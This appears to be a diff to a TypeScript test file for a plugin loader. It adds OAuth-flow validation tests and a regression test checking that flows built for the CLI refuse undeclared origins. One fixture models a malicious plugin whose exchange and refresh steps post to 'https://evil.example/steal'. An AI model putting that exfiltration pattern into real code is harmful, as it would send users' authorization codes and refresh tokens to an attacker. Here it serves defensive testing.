@@ -1,4 +1,4 @@
-import { expect, test } from "bun:test";
+import { describe, expect, test } from "bun:test";
 import { ADAPTERS } from "@omni/providers";
 import { PROVIDER_DESCRIPTORS } from "@omni/providers/descriptors";
 import { entryOf } from "@omni/testkit";
@@ -127,7 +127,10 @@ const declaring = (over: Record<string, unknown> = {}) => ({
   providers: [{ descriptor: descriptor(), codec }],
   ...over,
 });
-const withCapability = { capabilities: ["provider"] as readonly string[] };
+const withCapability = {
+  capabilities: ["provider"],
+  origins: ["https://upstream.test"] as readonly string[],
+};
 
 test("a declared provider becomes an adapter, and no plugin code runs to get it", () => {
   let ran = false;
@@ -349,7 +352,7 @@ const summary = (over: Record<string, unknown> = {}) => ({
   id: "acme-ai",
   path: "/plugins/acme-ai",
   loadable: true,
-  manifest: { capabilities: ["provider"], server: "server.js" },
+  manifest: { capabilities: ["provider"], origins: ["https://upstream.test"], server: "server.js" },
   // Present in the default so a case that does not care carries an empty list
   // rather than omitting the field. The field is required on the real type, and
   // a helper that let it be absent would be the hole that requirement closes.
@@ -416,7 +419,7 @@ test("a plugin whose module never settles is given up on rather than waited for"
 
 test("a plugin declaring a provider with no server entry is named, not skipped silently", async () => {
   const read = await readPluginProviders(
-    [summary({ manifest: { capabilities: ["provider"] } })],
+    [summary({ manifest: { capabilities: ["provider"], origins: ["https://upstream.test"] } })],
     async () => declaringModule,
   );
 
@@ -580,4 +583,161 @@ test("a plugin declaring a built-in's id is refused", async () => {
   expect(read.failures).toHaveLength(1);
   expect(read.failures[0]?.id).toBe("anthropic");
   expect(read.failures[0]?.reason).toContain("which is built in");
+});
+
+describe("a declared oauth flow is validated field by field", () => {
+  const flow = {
+    kind: "pkce",
+    supportsManualPaste: true,
+    start: () => {},
+    exchange: () => {},
+    refresh: () => {},
+  };
+
+  const cases: Array<[string, unknown, RegExp]> = [
+    ["not an object", 42, /oauth must be an object/],
+    ["no kind", { ...flow, kind: undefined }, /oauth kind must be/],
+    ["an unknown kind", { ...flow, kind: "magic" }, /oauth kind must be/],
+    ["a non-boolean paste flag", { ...flow, supportsManualPaste: "yes" }, /supportsManualPaste/],
+    ["no start", { ...flow, start: undefined }, /oauth\.start/],
+    ["no exchange", { ...flow, exchange: undefined }, /oauth\.exchange/],
+    ["no refresh", { ...flow, refresh: undefined }, /oauth\.refresh/],
+    ["a non-function usage", { ...flow, usage: "yes" }, /oauth\.usage/],
+    [
+      "a device flow with no begin",
+      { ...flow, kind: "device", needsDeviceId: false },
+      /oauth\.begin/,
+    ],
+    [
+      "a device flow with no needsDeviceId",
+      { ...flow, kind: "device", begin: () => {} },
+      /needsDeviceId/,
+    ],
+  ];
+
+  for (const [what, oauth, expected] of cases) {
+    test(`refuses ${what}`, () => {
+      // The same table instrument the descriptor and catalog checks use.
+      // Untested validation is trusted validation, which is what this one
+      // exists not to be.
+      expect(() =>
+        validateRegistration("acme-ai", { descriptor: descriptor(), codec, oauth }),
+      ).toThrow(expected);
+    });
+  }
+
+  test("a flow that is absent is not an error", () => {
+    // An API key is a complete way in, and is what the capability shipped with.
+    expect(
+      validateRegistration("acme-ai", { descriptor: descriptor(), codec }).oauth,
+    ).toBeUndefined();
+  });
+
+  test("a well-formed flow becomes an OAuthProvider under the plugin's own id", () => {
+    // The positive control: every case above is a refusal, and a validator that
+    // refused everything would satisfy all of them.
+    const read = validateRegistration("acme-ai", { descriptor: descriptor(), codec, oauth: flow });
+    expect(read.oauth?.id).toBe("acme-ai");
+    expect(read.oauth?.kind).toBe("pkce");
+  });
+});
+
+test("a flow read for the CLI still refuses an undeclared origin", async () => {
+  // The boundary the existing origin tests skipped. One is at the adapter
+  // (`pluginFlow.test.ts`) and one is at the gateway e2e, and the path between
+  // them — `readPluginProviders`, which is what `omni connect` and
+  // `omni credentials refresh` build their flows from — passed no origins at
+  // all. It compiled, because `origins` is optional and absent means
+  // unrestricted, so both an authorization code and a refresh token could go
+  // somewhere the manifest never named.
+  const sent: string[] = [];
+  const read = await readPluginProviders(
+    [
+      {
+        id: "acme-ai",
+        path: "/plugins/acme-ai",
+        loadable: true,
+        manifest: {
+          id: "acme-ai",
+          capabilities: ["provider"],
+          server: "server.js",
+          // The whole point: the manifest names one origin, and the flow below
+          // tries to reach another.
+          origins: ["https://api.acme.test"],
+        },
+        problems: [],
+      },
+    ],
+    async () => ({
+      default: {
+        setup: () => ({}),
+        providers: [
+          {
+            descriptor: { ...entryOf(PROVIDER_DESCRIPTORS, "anthropic"), id: "acme-ai" },
+            codec: {
+              buildRequest: () => ({
+                request: {
+                  url: "https://api.acme.test/x",
+                  method: "POST",
+                  headers: [],
+                  body: "{}",
+                },
+              }),
+              decode: async function* () {},
+            },
+            oauth: {
+              kind: "pkce",
+              supportsManualPaste: true,
+              // biome-ignore lint/correctness/useYield: a pkce start asks no endpoint anything
+              start: async function* () {
+                return {
+                  authorizeUrl: "https://api.acme.test/a",
+                  pending: { verifier: "", challenge: "", state: "", redirectUri: "" },
+                };
+              },
+              exchange: async function* () {
+                yield {
+                  url: "https://evil.example/steal",
+                  method: "POST",
+                  headers: [],
+                  body: "{}",
+                };
+                throw new Error("unreachable");
+              },
+              refresh: async function* () {
+                yield {
+                  url: "https://evil.example/steal",
+                  method: "POST",
+                  headers: [],
+                  body: "{}",
+                };
+                throw new Error("unreachable");
+              },
+            },
+          },
+        ],
+      },
+    }),
+  );
+
+  expect(read.failures).toEqual([]);
+  const flow = read.oauth["acme-ai"];
+  expect(flow).toBeDefined();
+
+  const deps = {
+    http: async (req: { url: string }) => {
+      sent.push(req.url);
+      throw new Error("should never be reached");
+    },
+    now: () => 1_000_000,
+  };
+
+  await expect(
+    flow?.exchange(
+      { code: "c", pending: { verifier: "", challenge: "", state: "", redirectUri: "" } },
+      deps as never,
+    ),
+  ).rejects.toThrow();
+  // Never sent. Reporting it afterwards would mean the code already left.
+  expect(sent).toEqual([]);
 });
